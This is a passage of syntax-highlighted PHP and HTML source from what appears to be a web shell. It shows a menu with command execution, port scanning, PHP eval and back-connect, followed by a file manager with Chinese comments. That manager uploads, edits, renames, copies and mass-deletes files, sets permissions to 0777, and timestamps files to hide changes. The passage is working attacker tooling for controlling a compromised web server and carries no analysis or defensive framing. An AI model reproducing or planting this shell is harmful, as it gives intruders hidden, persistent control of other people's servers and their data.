<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('shell');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Execute</span> <span style="color: #d54e53; font-weight: bold;">Command</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('phpenv');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">PHP</span> <span style="color: #d54e53; font-weight: bold;">Variable</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('portscan');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Port</span> <span style="color: #d54e53; font-weight: bold;">Scan</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('secinfo');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Security</span> <span style="color: #d54e53; font-weight: bold;">information</span><span style="color: #7aa6da;">&lt;/a&gt;</span> |<span style="color: #d54e53; background-color: #424242;"> </span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('eval');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Eval</span> <span style="color: #d54e53; font-weight: bold;">PHP</span> <span style="color: #d54e53; font-weight: bold;">Code</span><span style="color: #7aa6da;">&lt;/a&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #c397d8;">&lt;?php</span> <span style="color: #b9ca4a;">if</span> (!<span style="color: #d54e53; font-weight: bold;">IS_WIN</span>) {<span style="color: #c397d8;">?&gt;</span> | <span style="color: #7aa6da;">&lt;a</span> <span style="color: #7aa6da;">href=</span><span style="color: #70c0b1;">"javascript:g('backconnect');"</span><span style="color: #7aa6da;">&gt;</span><span style="color: #d54e53; font-weight: bold;">Back</span><span style="text-decoration: underline;"> </span><span style="color: #d54e53; font-weight: bold; text-decoration: underline;">Connect</span><span style="color: #7aa6da; text-decoration: underline;">&lt;/a&gt;</span><span style="color: #c397d8; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> }</span><span style="color: #c397d8; text-decoration: underline;">?&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/td&gt;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #7aa6da;">&lt;/tr&gt;</span>
<span style="color: #7aa6da;">&lt;/table&gt;</span>
<span style="color: #7aa6da;">&lt;table</span> <span style="color: #7aa6da;">width=</span><span style="color: #70c0b1;">"100%"</span> <span style="color: #7aa6da;">border=</span><span style="color: #70c0b1;">"0"</span> <span style="color: #7aa6da;">cellpadding=</span><span style="color: #70c0b1;">"15"</span> <span style="color: #7aa6da;">cellspacing=</span><span style="color: #70c0b1;">"0"</span><span style="color: #7aa6da;">&gt;&lt;tr&gt;&lt;td&gt;</span>
<span style="color: #c397d8;">&lt;?php</span>
$<span style="color: #e7c547;">errmsg</span> &amp;&amp; <span style="color: #eaeaea; background-color: #000000;">m(</span>$<span style="color: #e7c547;">errmsg</span>);

<span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#36335;&#24452;</span>
<span style="color: #b9ca4a;">if</span> (!$<span style="color: #e7c547;">dir</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dir</span> = $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">"DOCUMENT_ROOT"</span>] ? $<span style="color: #7aa6da;">_SERVER</span>[<span style="color: #70c0b1;">"DOCUMENT_ROOT"</span>] : <span style="color: #70c0b1;">'.'</span>;
}
$<span style="color: #e7c547;">nowpath</span> = <span style="color: #eaeaea; background-color: #000000;">getPath(</span><span style="color: #d54e53; font-weight: bold;">SA_ROOT</span>, $<span style="color: #e7c547;">dir</span>);
<span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">substr(</span>$<span style="color: #e7c547;">dir</span>, -<span style="color: #eaeaea; background-color: #000000;">1</span>) != <span style="color: #70c0b1;">'/'</span>) {
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dir</span> = $<span style="color: #e7c547;">dir</span>.<span style="color: #70c0b1;">'/'</span>;
}

<span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">action</span> == <span style="color: #70c0b1;">'file'</span>) {

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21028;&#26029;&#35835;&#20889;&#24773;&#20917;</span>
<span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dir_writeable</span> = @<span style="color: #eaeaea; background-color: #000000;">is_writable(</span>$<span style="color: #e7c547;">nowpath</span>) ? <span style="color: #70c0b1;">'Writable'</span> : <span style="color: #70c0b1;">'Non-writable'</span>;

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#21019;&#24314;&#30446;&#24405;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">newdirname</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">mkdirs</span> = $<span style="color: #e7c547;">nowpath</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">newdirname</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">mkdirs</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Directory has already existed'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Directory created '</span>.(@<span style="color: #eaeaea; background-color: #000000;">mkdir(</span>$<span style="color: #e7c547;">mkdirs</span>,<span style="color: #eaeaea; background-color: #000000;">0777</span>) ? <span style="color: #70c0b1;">'success'</span> : <span style="color: #70c0b1;">'failed'</span>)<span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">chmod(</span>$<span style="color: #e7c547;">mkdirs</span>,<span style="color: #eaeaea; background-color: #000000;">0777</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#19978;&#20256;&#25991;&#20214;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">doupfile</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'File upload '</span>.(@<span style="color: #eaeaea; background-color: #000000;">copy(</span>$<span style="color: #7aa6da;">_FILES</span>[<span style="color: #70c0b1;">'uploadfile'</span>][<span style="color: #70c0b1;">'tmp_name'</span>],$<span style="color: #e7c547;">uploaddir</span>.<span style="color: #70c0b1;">'/'</span><span style="text-decoration: underline;">.$</span><span style="color: #7aa6da; text-decoration: underline;">_FILES</span><span style="text-decoration: underline;">[</span><span style="color: #70c0b1; text-decoration: underline;">'uploadfile'</span><span style="text-decoration: underline;">][</span><span style="color: #70c0b1; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">]) ? </span><span style="color: #70c0b1; text-decoration: underline;">'success'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">editfilename</span> &amp;&amp; $<span style="color: #e7c547;">filecontent</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fp</span> = @<span style="color: #eaeaea; background-color: #000000;">fopen(</span>$<span style="color: #e7c547;">editfilename</span>,<span style="color: #70c0b1;">'w'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Save file '</span>.(@<span style="color: #eaeaea; background-color: #000000;">fwrite(</span>$<span style="color: #e7c547;">fp</span>,$<span style="color: #e7c547;">filecontent</span>) ? <span style="color: #70c0b1;">'success'</span> : <span style="color: #70c0b1;">'failed'</span>));
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   @<span style="color: #eaeaea; background-color: #000000;">fclose(</span>$<span style="color: #e7c547;">fp</span>);
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#32534;&#36753;&#25991;&#20214;&#23646;&#24615;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">pfile</span> &amp;&amp; $<span style="color: #e7c547;">newperm</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">pfile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'The original file does not exist'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">newperm</span> = <span style="color: #eaeaea; background-color: #000000;">base_convert(</span>$<span style="color: #e7c547;">newperm</span>,<span style="color: #eaeaea; background-color: #000000;">8</span>,<span style="color: #eaeaea; background-color: #000000;">10</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Modify file attributes '</span>.(@<span style="color: #eaeaea; background-color: #000000;">chmod(</span>$<span style="color: #e7c547;">pfile</span>,$<span style="color: #e7c547;">newperm</span>) ? <span style="color: #70c0b1;">'success'</span> : <span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25913;&#21517;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">oldname</span> &amp;&amp; $<span style="color: #e7c547;">newfilename</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">nname</span> = $<span style="color: #e7c547;">nowpath</span><span style="color: #d54e53; font-weight: bold;">.</span>$<span style="color: #e7c547;">newfilename</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">nname</span>) || !<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">oldname</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span>$<span style="color: #e7c547;">nname</span>.<span style="color: #70c0b1;">' has already existed or original file does not exist'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(basename(</span>$<span style="color: #e7c547;">oldname</span>).<span style="color: #70c0b1;">' renamed '</span>.<span style="color: #eaeaea; background-color: #000000;">basename(</span>$<span style="color: #e7c547;">nname</span>).(@<span style="color: #eaeaea; background-color: #000000;">rename(</span>$<span style="color: #e7c547;">oldname</span>,<span style="text-decoration: underline;">$</span><span style="color: #e7c547; text-decoration: underline;">nname</span><span style="text-decoration: underline;">) ? </span><span style="color: #70c0b1; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#22797;&#21046;&#25991;&#20214;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">sname</span> &amp;&amp; $<span style="color: #e7c547;">tofile</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">tofile</span>) || !<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">sname</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'The goal file has already existed or original file does not exist</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(basename(</span>$<span style="color: #e7c547;">tofile</span>).<span style="color: #70c0b1;">' copied '</span>.(@<span style="color: #eaeaea; background-color: #000000;">copy(</span>$<span style="color: #e7c547;">sname</span>,$<span style="color: #e7c547;">tofile</span>) ? <span style="color: #eaeaea; background-color: #000000;">basename(</span>$<span style="color: #e7c547;">to</span><span style="color: #e7c547; text-decoration: underline;">file</span><span style="text-decoration: underline;">).</span><span style="color: #70c0b1; text-decoration: underline;">' success'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#20811;&#38534;&#26102;&#38388;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">curfile</span> &amp;&amp; $<span style="color: #e7c547;">tarfile</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!@<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">curfile</span>) || !@<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">tarfile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'The goal file has already existed or original file does not exist</span><span style="color: #70c0b1; text-decoration: underline;">'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">time</span> = @<span style="color: #eaeaea; background-color: #000000;">filemtime(</span>$<span style="color: #e7c547;">tarfile</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Modify file the last modified '</span>.(@<span style="color: #eaeaea; background-color: #000000;">touch(</span>$<span style="color: #e7c547;">curfile</span>,$<span style="color: #e7c547;">time</span>,$<span style="color: #e7c547;">time</span>) ? <span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#33258;&#23450;&#20041;&#26102;&#38388;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span> ($<span style="color: #e7c547;">curfile</span> &amp;&amp; $<span style="color: #e7c547;">year</span> &amp;&amp; $<span style="color: #e7c547;">month</span> &amp;&amp; $<span style="color: #e7c547;">day</span> &amp;&amp; $<span style="color: #e7c547;">hour</span> &amp;&amp; $<span style="color: #e7c547;">minute</span> &amp;&amp; $<span style="color: #e7c547;">second</span>) <span style="text-decoration: underline;">{</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (!@<span style="color: #eaeaea; background-color: #000000;">file_exists(</span>$<span style="color: #e7c547;">curfile</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(basename(</span>$<span style="color: #e7c547;">curfile</span>).<span style="color: #70c0b1;">' does not exist'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">time</span> = <span style="color: #eaeaea; background-color: #000000;">strtotime(</span><span style="color: #70c0b1;">"$year-$month-$day $hour:$minute:$second"</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Modify file the last modified '</span>.(@<span style="color: #eaeaea; background-color: #000000;">touch(</span>$<span style="color: #e7c547;">curfile</span>,$<span style="color: #e7c547;">time</span>,$<span style="color: #e7c547;">time</span>) ? <span style="color: #70c0b1;">'</span><span style="color: #70c0b1; text-decoration: underline;">success'</span><span style="text-decoration: underline;"> : </span><span style="color: #70c0b1; text-decoration: underline;">'failed'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">// </span><span style="color: #969896; font-style: italic;">&#25209;&#37327;&#21024;&#38500;&#25991;&#20214;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">elseif</span>($<span style="color: #e7c547;">doing</span> == <span style="color: #70c0b1;">'delfiles'</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> ($<span style="color: #e7c547;">dl</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">dfiles</span>=<span style="color: #70c0b1;">''</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">succ</span> = $<span style="color: #e7c547;">fail</span> = <span style="color: #eaeaea; background-color: #000000;">0</span>;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">foreach</span> ($<span style="color: #e7c547;">dl</span> <span style="color: #b9ca4a;">as</span> $<span style="color: #e7c547;">filepath</span>) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (<span style="color: #eaeaea; background-color: #000000;">is_dir(</span>$<span style="color: #e7c547;">filepath</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (@<span style="color: #eaeaea; background-color: #000000;">deltree(</span>$<span style="color: #e7c547;">filepath</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">succ</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fail</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #b9ca4a;">if</span> (@<span style="color: #eaeaea; background-color: #000000;">unlink(</span>$<span style="color: #e7c547;">filepath</span>)) {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">succ</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   $<span style="color: #e7c547;">fail</span>++;
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Deleted folder/file have finished,choose '</span>.<span style="color: #eaeaea; background-color: #000000;">count(</span>$<span style="color: #e7c547;">dl</span>).<span style="color: #70c0b1;">' success '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">succ</span><span style="text-decoration: underline;">.</span><span style="color: #70c0b1; text-decoration: underline;">' fail '</span><span style="text-decoration: underline;">.$</span><span style="color: #e7c547; text-decoration: underline;">fail</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   } <span style="color: #b9ca4a;">else</span> {
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">m(</span><span style="color: #70c0b1;">'Please select folder/file(s)'</span>);
<span style="background-color: #424242;"> </span>   <span style="background-color: #424242;"> </span>   }
<span style="background-color: #424242;"> </span>   }

<span style="background-color: #424242;"> </span>   <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">&#25805;&#20316;&#23436;&#27605;</span>
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=<span style="color: #7aa6da;">&gt;</span><span style="color: #70c0b1;">'createdir'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'newdirname'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'fileperm'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'newperm'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'pfile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'copyfile'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'sname'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'tofile'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'rename'</span>));
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'oldname'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'newfilename'</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">makehide(</span><span style="color: #70c0b1;">'dir'</span>,$<span style="color: #e7c547;">nowpath</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formfoot(</span>);
<span style="background-color: #424242;"> </span>   <span style="color: #eaeaea; background-color: #000000;">formhead(array(</span><span style="color: #70c0b1;">'name'</span>=&gt;<span style="color: #70c0b1;">'fileopform'</span>, <span style="color: #70c0b1;">'target'</span>=&gt;<span style="color: #70c0b1;">'_blank'</span>));
